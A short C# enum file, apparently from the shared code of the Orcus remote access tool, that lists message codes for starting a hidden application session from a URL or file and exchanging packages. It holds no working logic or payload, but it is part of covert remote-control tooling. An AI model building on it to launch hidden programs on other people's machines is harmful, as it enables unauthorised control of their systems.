namespace Orcus.Shared.Commands.HiddenApplication
{
    public enum HiddenApplicationCommunication : byte
    {
        StartSessionFromUrl,
        StartSessionFromFile,
        FailedSessionAlreadyStarted,
        FailedProcessDidntStart,
        SessionStartedSuccessfully,
        GetPackage,
        ResponsePackage
    }
}